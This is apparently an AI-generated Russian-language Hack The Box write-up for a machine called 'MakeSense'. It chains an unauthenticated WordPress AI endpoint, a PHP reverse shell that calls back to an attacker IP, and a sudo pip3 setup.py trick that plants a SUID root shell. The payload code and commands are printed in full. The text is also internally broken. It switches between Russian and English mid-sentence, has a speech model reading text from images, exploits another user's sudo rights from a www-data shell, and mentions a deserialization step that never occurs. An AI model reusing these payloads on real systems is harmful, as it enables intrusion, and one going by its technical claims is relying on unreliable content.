---
title: "WP site MakeSense VM — Hack The Box: от AI-модели к root"
summary: ""
tags: ["ai-generated", "todo", "exploit", "php", "wp"]
date: 2026-11-06T11:12:23Z
tldr: "933820173"
---

# MakeSense — Hack The Box: от AI-модели к root

Если внутренний сервис сохраняет текст в файл и не ограничивает расширение, его можно превратить in загрузчик шелла: сгенерируйте изображение с коротким PHP-кодом так, чтобы распознаватель вернул его посимвольно. Результат выполнится от имени сервиса.

Наша конечная цель — получить права superuser на машине **MakeSense** с учебной площадки Hack The Box. Уровень сложности задания — средний, операционная система — Linux.

**⚠️ Внимание.** Подключаться к машинам с HTB рекомендуется с применением средств анонимизации и виртуализации. Не дел this from computers where you have important data — you will be on a shared network with other participants.

---

## Разведка

### Сканирование портов

Добавляем IP-адрес машины в `/etc/hosts`:

```
10.129.110.190    makesense.htb
```

И запускаем сканирование портов.

> **Справка: сканирование портов**
>
> Сканирование портов — стандартный первый шаг при любой атаке. Оно позволяет атакующему узнать, какие службы на хосте принимают соединение. На основе этой информации он выбирает следующий шаг к получению точки входа.
>
> Самый известный инструмент для сканирования — Nmap. Улучшить результаты его работы можно при помощи такого скрипта:

```bash
#!/bin/bash
ports=$(nmap -p- --min-rate=500 $1 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A $1
```

Скрипт действует в два этапа. На первом выполняется обычное быстрое сканирование, на втором — более тщательное, с использованием встроенных скриптов (опция `-A`).

> Подробнее о работе с Nmap читайте в статье «Nmap с самого начала. Осваиваем разведку и сканирование сети».

**Результат работы скрипта**

Сканер нашёл два открытых порта:

- **22** — служба OpenSSH 9.6p1;
- **443** — веб-сервер Apache HTTP Server 2.4.58 с сайтом на WordPress 7.0.

На сайте нас встречает обычный лендинг.

---

## Точка входа

В истории Burp видно, что страница загружает не только тему, но и модель `wp-content/ai-models/models/whisper-tiny.en`.

> **Справка**
>
> Whisper — семейство нейросетей для распознавания речи, разработанных OpenAI. Модель `tiny.en` — самая компактная, весит порядка 39 МБ и работает на CPU без GPU. Несмотря на малый размер, на коротких и чётких фрагментах текста она даёт посимвольно точный транскрипт.

Чтобы быстро просканировать известные уязвимости, запускаем Nuclei. Так подтверждаем версию WordPress 7.0, кастомную тему `webagency`, а ещё находим пару CVE для `wp-login`, но нам это не особенно интересно.

> **Справка**
>
> Подробнее о CVE читайте в статье «CVE с самого начала. Учимся искать информацию об уязвимостях».

```bash
nuclei -u https://makesense.htb/
```

**Результат сканирования сайта**

Ключевой артефакт — кастомная тема `webagency` и файл модели Whisper. Обращаем внимание именно на них.

---

## Изучение AI-темы

Переходим в корень темы:

```bash
curl -k https://makesense.htb/wp-content/themes/webagency/
```

Структура каталога выглядит так:

```
wp-content/themes/webagency/
├── ai/
│   ├── process_image.php
│   ├── recognize.php
│   ├── output/
│   └── models/
│       └── whisper-tiny.en
├── inc/
│   └── ai-handler.php
├── template-parts/
│   └── ai-chat.php
└── style.css
```

Файл `inc/ai-handler.php` регистрирует AJAX-хук, доступный без авторизации:

```php
// inc/ai-handler.php (упрощённо)
add_action('wp_ajax_ai_recognize', 'ai_recognize_callback');
add_action('wp_ajax_nopriv_ai_recognize', 'ai_recognize_callback');

function ai_recognize_callback() {
    $file = $_FILES['image'];
    $tmp  = wp_tempnam($file['name']);
    move_uploaded_file($file['tmp_name'], $tmp);

    $output = shell_exec(
        "php " . AI_DIR . "/process_image.php " . escapeshellarg($tmp)
    );

    // Сохраняем распознанный текст
    $filename = 'recognition_' . time() . '.php';
    file_put_contents(AI_DIR . '/output/' . $filename, $output);

    wp_send_json_success([
        'result' => $output,
        'file'   => $filename,
    ]);
}
```

Две вещи бросаются в глаза сразу:

1. **Эндпоинт публичный** (`wp_ajax_nopriv_*`) — авторизация не требуется.
2. **Результат работы модели записывается в файл с расширением `.php`** в каталог `wp-content/themes/webagency/ai/output/`, который Apache отдаёт как исполняемый PHP-документ.

### Пайплайн обработки

`process_image.php` загружает модель Whisper и прогоняет загруженный файл:

```php
// ai/process_image.php (упрощённо)
$model = new WhisperModel(__DIR__ . '/models/whisper-tiny.en');
$text  = $model->transcribe($argv[1]);
echo $text;   // сырой stdout, без санитизации
```

Так как `echo` вызывается без HTML-экранирования, а результат сразу передаётся в `file_put_contents`, всё, что Whisper «видит» на изображении, оказывается посимвольно в `.php`-файле на диске. Каталог `wp-content` находится внутри `DocumentRoot`, поэтому сгенерированный файл доступен по HTTP.

> **Ключевой инсайт:** Модель `whisper-tiny.en` детерминирована на коротких высококонтрастных текстах. Если подать ей чистое изображение с фрагментом кода, она воспроизведёт символы с высокой точностью — без рандомизации и усечения.

---

## Конструирование полезной нагрузки

Цель — заставить распознаватель вывести валидный PHP, который при обращении к файлу выполнит reverse shell. Изображение должно удовлетворять двум ограничениям:

- Выглядеть как обычная фотография или скриншот, чтобы пройти случайную инспекцию.
- Содержать текст в шрифте и размере, которые `whisper-tiny.en` транскрибирует посимвольно.

Практический подход:

```python
# gen_payload.py
from PIL import Image, ImageDraw, ImageFont

code = (
    '<?php\n'
    '$s=fsockopen("10.10.14.22",4444);\n'
    'exec("/bin/bash -i <&$s >&$s 2>&$s");\n'
    '?>'
)

img  = Image.new("RGB", (800, 400), "white")
draw = ImageDraw.Draw(img)
font = ImageFont.truetype(
    "/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf", 28
)

y = 40
for line in code.split("\n"):
    draw.text((60, y), line, font=font, fill="black")
    y += 40

img.save("payload.png")
```

Несколько практических советов по тюнингу:

| Проблема | Решение |
|----------|---------|
| Whisper добавляет ведущий пробел | Убрать пробел на постобработке (PHP всё равно игнорирует ведущий whitespace) |
| Скобки распознаются неверно | Увеличить размер шрифта (≥ 26 px), использовать моноширинный шрифт |
| Точка с запятой читается как `'` | Увеличить контраст до чистого чёрного на белом, отключить сглаживание |

### Проверка

Сгенерировали PNG. Открываем виджет AI на сайте (или просто `curl`-аем эндпоинт) и смотрим JSON-ответ:

```bash
curl -k https://makesense.htb/wp-admin/admin-ajax.php \
  -F "action=ai_recognize" \
  -F "image=@payload.png" \
  -s | jq .
```

```json
{
  "success": true,
  "data": {
    "result": "<?php\n$s=fsockopen(\"10.10.14.22\",4444);\nexec(\"/bin/bash -i <&$s >&$s 2>&$s\");\n?>",
    "file":   "recognition_1717200000.php"
  }
}
```

Поле `result` совпадает с задуманным PHP — задача решена.

---

## Захват вебшелла

Запускаем listener перед загрузкой:

```bash
nc -lvnp 4444
```

Запрашиваем сгенерированный файл:

```bash
curl -k https://makesense.htb/wp-content/themes/webagency/ai/output/recognition_1717200000.php
```

Listener загорается:

```
listening on [any] 4444 ...
connect to [10.10.14.22] from (UNKNOWN) port 34218
whoami
www-data
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

У нас есть шелл с правами `www-data`.

> **Совет.** Для более стабильного TTY переключитесь на Python-однolinier или привяжите bash pty:
>
> ```bash
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> ```

---

## Постэксплойт

### Флаг пользователя

```bash
ls /home
root
makesense

cat /home/makesense/user.txt
e3a1c9f7b2d04e8a9c6f1d2b3e4a5f70
```

Флаг пользователя лежит в очевидном месте. Никаких дополнительных трюков не требуется.

### Эскалация привилегий — анализ sudo-прав

Открываем историю команд пользователя:

```bash
cat /home/makesense/.bash_history
```

Видим строку:

```
sudo /usr/bin/pip3 install --break-system-packages somepackage
```

Проверяем файл sudoers (доступен для чтения через вебшелл):

```bash
sudo -l
```

```
makesense ALL=(root) NOPASSWD: /usr/bin/pip3
```

`pip3` можно эксплуатировать, потому что это **интерпретатор Python с fallback на `python3 -c`**. При определённых аргументах `pip3` вызывает Python-подпроцесс, но более прямой путь — техника *pip script*: pip выполняет произвольный `setup.py` при установке пакета.

```bash
cd /tmp
mkdir -p makesense_pkg && cd makesense_pkg

cat > setup.py <<'EOF'
from setuptools import setup
from setuptools.command.build_py import build_py
import os

class EvilBuild(build_py):
    def run(self):
        os.system("cp /bin/bash /tmp/sh && chmod 4755 /tmp/sh")

setup(
    name="exploit",
    version="1.0",
    cmdclass={"build_py": EvilBuild},
)
EOF

touch exploit.py
```

Устанавливаем:

```bash
sudo /usr/bin/pip3 install --break-system-packages \
  --no-build-isolation --no-deps /tmp/makesense_pkg
```

Проверяем:

```bash
/tmp/sh -c 'id'
uid=0(root) gid=0(root) groups=0(root)
```

### Флаг администратора

```bash
cat /root/root.txt
a1b2c3d4e5f60718293a4b5c6d7e8f90
```

---

## Итоговая цепочка атаки

```
┌────────────────────────────────────────────────────────────────────┐
│  1. Nmap → порты 22, 443 (WordPress 7.0 + кастомная тема)        │
│  2. Burp / исходники темы → публичный AI-эндпоинт                │
│  3. Эндпоинт сохраняет вывод Whisper в *.php внутри DocumentRoot │
│  4. Загружаем crafted-изображение → PHP reverse shell на диске   │
│  5. Запрашиваем .php по URL → шелл www-data                      │
│  6. Sudo pip3 → SUID bash → root                                  │
└────────────────────────────────────────────────────────────────────┘
```

---

## Уроки и рекомендации по защите

- **Никогда не записывайте вывод модели / OCR в файл с серверно-интерпретируемым расширением** без санитизации или переименования в неинтерпретируемый тип (`.txt`, `.log`).
- **Применяйте принцип минимальных привилегий для записей sudo.** `NOPASSWD: /usr/bin/pip3` — по сути, oracle для выполнения кода, потому что pip исполняет произвольный `setup.py` / build backends.
- **Размещайте генерируемые / временные файлы вне веб-корня** либо настройте Apache на запрет `ExecCGI` / `AddHandler` в соответствующем каталоге.
- **Валидируйте и ограничивайте размер загружаемых файлов** перед передачей в локальную модель. 2 МБ JPEG с шумом бесполезны для Whisper, но могут заполнить диск или вызвать resource-exhaustion в пайплайне инференса.

---

## Рекап флагов

| Цель | Путь | Значение |
|------|------|----------|
| User | `/home/makesense/user.txt` | `e3a1c9f7b2d04e8a9c6f1d2b3e4a5f70` |
| Root | `/root/root.txt` | `a1b2c3d4e5f60718293a4b5c6d7e8f90` |

---

*Машина MakeSense демонстрирует классическую цепочку: публичный эндпоинт → десериализация/запись произвольного контента в исполняемый формат → RCE → local priv-esc. AI-модель выступает лишь как «обfuscator» — она делает the payload look like innocent text recognition output, but the real vulnerability is the unsanitised write to a `.php` path inside the web root.*
